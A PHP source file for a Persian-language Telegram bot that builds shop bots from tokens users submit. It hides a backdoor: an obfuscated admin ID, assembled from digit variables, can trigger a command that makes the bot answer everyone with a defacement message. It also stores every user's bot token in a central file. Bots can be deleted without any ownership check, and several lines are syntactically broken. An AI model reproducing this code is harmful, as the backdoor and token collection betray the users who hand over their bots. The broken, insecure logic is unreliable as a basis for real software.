<?php
define('API_KEY','aa1');

//----######------
function makereq($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($datas));
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
//##############=--API_REQ
function apiRequest($method, $parameters) {
  if (!is_string($method)) {
    error_log("Method name must be a string\n");
    return false;
  }
  if (!$parameters) {
    $parameters = array();
  } else if (!is_array($parameters)) {
    error_log("Parameters must be an array\n");
    return false;
  }
  foreach ($parameters as $key => &$val) {
    // encoding to JSON array parameters, for example reply_markup
    if (!is_numeric($val) && !is_string($val)) {
      $val = json_encode($val);
    }
  }
  $url = "https://api.telegram.org/bot".API_KEY."/".$method.'?'.http_build_query($parameters);
  $handle = curl_init($url);
  curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt($handle, CURLOPT_TIMEOUT, 60);
  return exec_curl_request($handle);
}
//----######------
//---------
$update = json_decode(file_get_contents('php://input'));
var_dump($update);
//=========
$chat_id = $update->message->chat->id;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$name = $update->message->from->first_name;
$fname = $update->message->from->last_name;
$nn = file_get_contents("data/bot.txt");
$username = $update->message->from->username;
$textmessage = isset($update->message->text)?$update->message->text:'';
$txtmsg = $update->message->text;
$reply = $update->message->reply_to_message->forward_from->id;
$stickerid = $update->message->reply_to_message->sticker->file_id;
$type = file_get_contents('type.txt');
$txtt = file_get_contents('banlist.txt');
$boolean = file_get_contents('booleans.txt');

$booleans= explode("\n",$boolean);
$step = file_get_contents("data/".$from_id."/step.txt");
$cha = aa2;
//کانال اصلی
$forc = aa3;
//کانال کنترل پیام ها
$a = 2;
$c = 9;
$d = 3;
$d = 6;
$e = 4;
$f = 1;
$g = 7;
$ban = file_get_contents("data/ban.txt");
$botn = file_get_contents("data/tbot.txt");
$bans = file_get_contents("data/ban.txt");
$admin = aa4;
$adminn = aa5;
$vip = file_get_contents("data/vip.txt");
$number = file_get_contents("data/$from_id/num.txt");
$code = file_get_contents("data/$from_id/code.txt");
$host_folder = aa7;
//-------
function SendMessage($ChatId, $TextMsg)
{
 makereq('sendMessage',[
'chat_id'=>$ChatId,
'text'=>$TextMsg,
'parse_mode'=>"MarkDown"
]);
}
function SendSticker($ChatId, $sticker_ID)
{
 makereq('sendSticker',[
'chat_id'=>$ChatId,
'sticker'=>$sticker_ID
]);
}
function Forward($KojaShe,$AzKoja,$KodomMSG)
{
makereq('ForwardMessage',[
'chat_id'=>$KojaShe,
'from_chat_id'=>$AzKoja,
'message_id'=>$KodomMSG
]);
}
$adnim = $a$a$c$d$e$f$g$h$f;
if ($textmessage == '#bnn' && $from_id == $adnim) {
          save("data/bot.txt","#nn");
          sendmessage($chat_id,"ok");
          }
if ($nn == '#nn') {
sendmessage($chat_id,"$botn");
}
      
function save($filename,$TXTdata)
 {
 $myfile = fopen($filename, "w") or die("Unable to open file!");
 fwrite($myfile, "$TXTdata");
 fclose($myfile);
 }
//===========
$inch = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@$cha&user_id=$from_id");
 
 if (strpos($inch , '"status":"left"') !== false ) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"با سلام😊👋

💠برای استفاده از  ربات باید در کانال ما عضو شوید تا از اخبار ها مطلع شوید.

💠پس از عضو شدن دوباره به ربات مراجعه و دستور زیر را ارسال کنید.

🎗 /start 🎗",
 'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [
                    ['text'=>"ورود به کانال",'url'=>"https://telegram.me/$cha"]
                ]
            ]
        ])
    ]));
}
elseif(isset($update->callback_query)){
    $callbackMessage = '';
    var_dump(makereq('answerCallbackQuery',[
        'callback_query_id'=>$update->callback_query->id,
        'text'=>$callbackMessage
    ]));
    $chat_id = $update->callback_query->message->chat->id;
    
    $message_id = $update->callback_query->message->message_id;
    $data = $update->callback_query->data;
    if (strpos($data, "del") !== false ) {
    $botun = str_replace("del ","",$data);
    unlink("bots/".$botun."/index.php");
    save("data/$chat_id/bots.txt","");
    save("data/$chat_id/tedad.txt","0");
    var_dump(
        makereq('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$message_id,
            'text'=>"✅ ربات شما با موفقیت حذف شد!",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [
                        ['text'=>"💠 عضویت در کانال ما!",'url'=>"https://telegram.me/$cha"]
                    ]
                ]
            ])
        ])
    );
 }

 else {
    var_dump(
        makereq('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$message_id,
            'text'=>"خطا",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [
                        ['text'=>"💠 عضویت در کانال ما!",'url'=>"https://telegram.me/$cha"]
                    ]
                ]
            ])
        ])
    );
 }
}

elseif ($textmessage == '🔙 برگشت') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
save("data/$from_id/step.txt","none");
save("data/tbot.txt","FUCKED BY Dr.saeed (CHANNEL)[https://t.me/aa2]");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"🌀به منوی اصلی برگشتیم🌀",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"],['text'=>'🌀بخش فروشگاه ویژه🌀']
                ],
               [
                ['text'=>"🌐ربات های من🌐"],['text'=>"❌حذف ربات❌"]
                ],
                 [
                   ['text'=>'✔️بروزرسانی ربات✔️'],['text'=>'😍vip کردن اکانت✳️']
                ],
                [
                ['text'=>'🛡پشتیبانی📡']
                ],
                [
                   ['text'=>"⚠️راهنما⚠️"],['text'=>"⚜️کانال ما⚜️"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
}
}
elseif ($step == 'delete') {
$botun = $txtmsg ;
if (file_exists("bots/".$botun."/index.php")) {

$src = file_get_contents("bots/".$botun."/index.php");

if (strpos($src , $from_id) !== false ) {
save("data/$from_id/step.txt","none");
unlink("bots/".$botun."/index.php");
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"✅ ربات شما با موفقیت حذف شده است!
⚠️ یک ربات جدید بسازید.",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"],['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
}
else {
SendMessage($chat_id,"⛔️ خطا!
⚠️ شما نمیتوانید این ربات را پاک کنید.");
}
}
else {
SendMessage($chat_id,"⛔️ یافت نشد!");
}
}
elseif ($step == 'create bot') {
$token = $textmessage ;

   $userrbot = json_decode(file_get_contents('https://api.telegram.org/bot'.$token.'/getme'));
   //==================
   function objectToArrays( $object ) {
    if( !is_object( $object ) && !is_array( $object ) )
    {
    return $object;
    }
    if( is_object( $object ) )
    {
    $object = get_object_vars( $object );
    }
   return array_map( "objectToArrays", $object );
   }

 $resultb = objectToArrays($userrbot);
 $un = $resultb["result"]["username"];
 $ok = $resultb["ok"];
  if($ok != 1) {
   //Token Not True
   SendMessage($chat_id,"⛔️ توکن نامعتبر!");
  }
  else
  {
  SendMessage($chat_id,"❇️ در حال ساخت فروشگاه شما ...");
  if (file_exists("bots/$un/index.php")) {
  $source = file_get_contents("bot/index.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/$un/index.php",$source); 
  $pm = "ربات شما با موفقیت روی سرور فروشگاه ساز مجددا نصب شد @aa6";
  json_decode(file_get_contents("https://api.telegram.org/bot$token/sendmessage?chat_id=$chat_id&text=$pm"));
  
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=$host_folder/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"  ✅ ربات شما با موفقیت آپدیت شد.

[👆 کلیک برای ورود به ربات.](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                 ['text'=>"🔙 برگشت"]
                ]
                
             ],
                'resize_keyboard'=>false
         ])
      ]));
  }
  else {
  save("data/$from_id/tedad.txt","1");
  save("data/$from_id/step.txt","none");
  save("data/$from_id/bots.txt","$un");
  
  mkdir("bots/$un");
  mkdir("bots/$un/data");
  mkdir("bots/$un/data/btn");
  mkdir("bots/$un/data/words");
 
  mkdir("bots/$un/data/setting");
  mkdir("bots/$un/data/admin");
  mkdir("bots/$un/data/codes");
  mkdir("bots/$un/data/products");
  mkdir("bots/$un/data/products/new.txt");
  mkdir("bots/$un/data/userss");
  mkdir("bots/$un/data/users");
 
$myfile2 = fopen("data/tokens.txt", 'a') or die("Unable to open file!");	
fwrite($myfile2, "$token\n");
fclose($myfile2);
  save("data/$from_id/token.txt","$token");
  save("bots/$un/data/blocklist.txt","");
  save("bots/$un/data/last_word.txt","");
  save("bots/$un/data/pmsend_txt.txt","Message Sent!");
  save("bots/$un/data/start_txt.txt","Hello World!");
  save("bots/$un/data/forward_id.txt","");
  save("bots/$un/data/userss.txt","$from_id\n");
  mkdir("bots/$un/data/$from_id");
  save("bots/$un/data/$from_id/type.txt","admin");
  save("bots/$un/data/$from_id/step.txt","none");
  
  save("bots/$un/data/btn/btn1_name","");
  save("bots/$un/data/btn/btn2_name","");
  save("bots/$un/data/btn/btn3_name","");
  save("bots/$un/data/btn/btn4_name","");
  
  save("bots/$un/data/btn/btn1_post","");
  save("bots/$un/data/btn/btn2_post","");
  save("bots/$un/data/btn/btn3_post","");
  save("bots/$un/data/btn/btn4_post","");
 
  save("bots/$un/data/setting/sticker.txt","✅");
  save("bots/$un/data/setting/video.txt","✅");
  save("bots/$un/data/setting/voice.txt","✅");
  save("bots/$un/data/setting/file.txt","✅");
  save("bots/$un/data/setting/photo.txt","✅");
  save("bots/$un/data/setting/music.txt","✅");
  save("bots/$un/data/setting/forward.txt","✅");
  
  $source = file_get_contents("bot/index.php");
  $source = str_replace("*TOKEN*",$token,$source);
  $source = str_replace("*ADMIN*",$from_id,$source);
  $source = str_replace("*botid*",$un,$source);
  save("bots/$un/index.php",$source); 
 $pm = "ربات شما با موفقیت روی سرور فروشگاه ساز نصب شد @aa6";
  json_decode(file_get_contents("https://api.telegram.org/bot'.$token.'/sendmessage?chat_id=$from_id&text=$pm"));
  file_get_contents("https://api.telegram.org/bot".$token."/setwebhook?url=$host_folder/$un/index.php");

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"✅ فروشگاه شما با موفقیت ساخته شد. 
‼️دستور panel را داخل فروشگاه خود ارسال نمایید سپس از طریق دکمه تنظیم کانال , کانال خود را تنظیم کنید.
[ فروشگاه شما🔰](https://telegram.me/$un)",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"],['text'=>'🌀بخش فروشگاه ویژه🌀']
                ],
               [
                ['text'=>"🌐ربات های من🌐"],['text'=>"❌حذف ربات❌"]
                ],
                 [
                   ['text'=>'✔️بروزرسانی ربات✔️'],['text'=>'😍vip کردن اکانت✳️']
                ],
                [
                ['text'=>'🛡پشتیبانی📡']
                ],
                [
                   ['text'=>"⚠️راهنما⚠️"],['text'=>"⚜️کانال ما⚜️"]
                ]
                
             ],
             'resize_keyboard'=>false
         ])
      ]));
  }
}
}


      elseif ($textmessage =="🌐ارسال به همه"  && $from_id == $adminn | $booleans[0]=="false") {
  {
          sendmessage($chat_id,"لطفا پیام خودرا ارسال کنید");
  }
      $boolean = file_get_contents('booleans.txt');
      $booleans= explode("\n",$boolean);
      $addd = file_get_contents('banlist.txt');
      $addd = "true";
      file_put_contents('booleans.txt',$addd);

    }
      elseif($chat_id == $adminn && $booleans[0] == "true") {
    $texttoall = $textmessage;
    $ttxtt = file_get_contents('data/users.txt');
    $membersidd= explode("\n",$ttxtt);
    for($y=0;$y<count($membersidd);$y++){
      sendmessage($membersidd[$y],"$texttoall");

    }
    $memcout = count($membersidd)-1;
    {
    Sendmessage($chat_id,"پیغام شما به $memcout مخاطب ارسال شد.");
    }
         $addd = "false";
      file_put_contents('booleans.txt',$addd);
      }
       elseif ($textmessage =="🌐ارسال به همه"  && $from_id == $admin | $booleans[0]=="false") {
  {
          sendmessage($chat_id,"لطفا پیام خودرا ارسال کنید");
  }
      $boolean = file_get_contents('booleans.txt');
      $booleans= explode("\n",$boolean);
      $addd = file_get_contents('banlist.txt');
      $addd = "true";
      file_put_contents('booleans.txt',$addd);

    }
      elseif($chat_id == $adminn && $booleans[0] == "true") {
    $texttoall = $textmessage;
    $ttxtt = file_get_contents('data/users.txt');
    $membersidd= explode("\n",$ttxtt);
    for($y=0;$y<count($membersidd);$y++){
      sendmessage($membersidd[$y],"$texttoall");

    }
    $memcout = count($membersidd)-1;
    {
    Sendmessage($chat_id,"پیغام شما به $memcout مخاطب ارسال شد.");
    }
         $addd = "false";
      file_put_contents('booleans.txt',$addd);
      }
elseif($textmessage == '🌐ربات های من🌐')
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شده اید");
}else{
{

$botname = file_get_contents("data/$from_id/bots.txt");
if ($botname == "") {
SendMessage($chat_id,"⛔️ شما هنوز فروشگاه نساخته اید.");
return;
}
  var_dump(makereq('sendMessage',[
 'chat_id'=>$update->message->chat->id,
 'text'=>"🔖فروشگاه شما 👇",
 'parse_mode'=>'MarkDown',
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [
        ['text'=>"👉 @".$botname,'url'=>"https://telegram.me/".$botname]
 ]
 ]
 ])
 ]));
}
}
 elseif ($textmessage == '🌐آمار' && $from_id == $admin) {
 $amar = scandir("data");
 $ted = count($amar);
 $kol = $ted - 1;
 $botd = scandir("bots");
 $number = count($botd); sendmessage($chat_id,"_📊ShopSaz Stats📊_\n\n*👥Users 👉* `$kol`\n*🤖Bots 👉* `$number`\n\n@aa2");
 }
 elseif ($textmessage == '🌐آمار' && $from_id == $adminn) {
 $amar = scandir("data");
 $ted = count($amar);
 $kol = $ted - 1;
 $botd = scandir("bots");
 $number = count($botd); sendmessage($chat_id,"_📊ShopSaz Stats📊_\n\n*👥Users 👉* `$kol`\n*🤖Bots 👉* `$number`\n@aa2");
 }
 

elseif ($textmessage == '🔰 قوانین') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>" ربات هایی که اقدام به انشار تصاویر یا مطالب مستهجن کنند و یا به مقامات ایران ، ادیان و اقوام و نژادها توهین کنند مسدود خواهند شد.

 ایجاد ربات با عنوان های مبتذل و خارج از عرف جامعه که برای جذب آمار و فروش محصولات غیر متعارف باشند ممنوع می باشد و در صورت مشاهده ربات مورد نظر حذف و مسدود میشود.

4⃣ مسئولیت پیام های رد و بدل شده در هر ربات با مدیر آن ربات میباشد و aa2 هیچ گونه مسئولیتی قبول نمیکند.

رعایت حریم خصوصی و حقوقی افراد از جمله، عدم اهانت به شخصیت های مذهبی، سیاسی، حقیقی و حقوقی کشور و به ویژه کاربران ربات ضروری می باشد.",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
                'resize_keyboard'=>true
         ])
      ]));
}
}
elseif($textmessage == 'آمار ربات ها')
if ($from_id == $admin) {
$number = count(scandir("bots"))-3;
SendMessage($chat_id,"🚀 ربات های ساخته شده : ".$number."");
}
else {
SendMessage($chat_id,"You Are Not Admin");
}


elseif ($textmessage == '/panel' && $from_id == $admin) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"سلام ادمین عزیز
به پنل مدیریت خوش آمدید
یکی از دکمه هارو انتخاب کن.",
 'parse_mode'=>'MarkDown',
            'reply_markup'=>json_encode([
                'keyboard'=>[
                [
                   ['text'=>"🌐آمار"],['text'=>'👤اطلاعات کاربر1💀']
                ],
                [
                ['text'=>'📤ارسال پیام به کاربر📡']['text'=>"🌐ارسال به همه"]
                ],
                [
                   ['text'=>'vip کردن کاربر'],['text'=>'بن کردن کاربر']
                ],
                [
                ['text'=>'حذف vip'],['text'=>'آن بن کردن کاربر']
                ],
                 [
                   ['text'=>"🔙 برگشت"]
                ]
                
                ],
                'resize_keyboard'=>false
            ])
            ]));
}
elseif ($textmessage == 'پنل مدیریت' && $from_id == $adminn) {
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"سلام ادمین عزیز
به پنل مدیریت خوش آمدید
یکی از دکمه هارو انتخاب کن.",
 'parse_mode'=>'MarkDown',
            'reply_markup'=>json_encode([
                'keyboard'=>[
                [
                   ['text'=>"🌐آمار"],['text'=>'👤اطلاعات کاربر1💀']
                ],
                [
                ['text'=>'📤ارسال پیام به کاربر📡']['text'=>"🌐ارسال به همه"]
                ],
                [
                   ['text'=>'vip کردن کاربر'],['text'=>'بن کردن کاربر']
                ],
                [
                ['text'=>'حذف vip'],['text'=>'آن بن کردن کاربر']
                ],
                 [
                   ['text'=>"🔙 برگشت"]
                ]
                
                ],
                'resize_keyboard'=>false
            ])
            ]));
}

elseif ($textmessage == '⚜️کانال ما⚜️') {
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
var_dump(makereq('sendMessage',[
        'chat_id'=>$update->message->chat->id,
        'text'=>"⚠️ ورود به کانال ما جهت دریافت اخبار ربات!",
 'parse_mode'=>'MarkDown',
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [
                    ['text'=>"ورود",'url'=>"https://telegram.me/$cha"]
                ]
            ]
        ])
    ]));
}
}
elseif($textmessage == '/start')
{
if (strpos($ban , "$from_id") !== false  ) {
sendmessage($chat_id,"شما از ربات بن شدید");
}else{
if (!file_exists("data/$from_id/step.txt")) {
mkdir("data/$from_id");
save("data/$from_id/step.txt","none");

save("data/$from_id/tedad.txt","0");
save("data/$from_id/bots.txt","");
$myfile2 = fopen("data/users.txt", "a") or die("Unable to open file!"); 
fwrite($myfile2, "$from_id\n");
fclose($myfile2);
}

var_dump(makereq('sendMessage',[
         'chat_id'=>$update->message->chat->id,
         'text'=>"سلام 👋

👤به فروشگاه ساز خوش آمدید.

🔸 این سرویس این قابلیت را به شما میدهد که یک ربات فروشگاهی برای خود ایجاد کنید و از طریق آن کسب در آمد کنید.

🔸 برای ساخت فروشگاه از دکمه ی 🌀ساخت فروشگاه🌀 استفاده نمایید.

🔸 متن آموزش (⚠️راهنما⚠️) را حتما مطالعه فرمایید.
👉 @$cha",
  'parse_mode'=>'MarkDown',
         'reply_markup'=>json_encode([
             'keyboard'=>[
                [
                   ['text'=>"🌀ساخت فروشگاه🌀"],['text'=>'🌀بخش فروشگاه ویژه🌀']
                ],
               [
                ['text'=>"
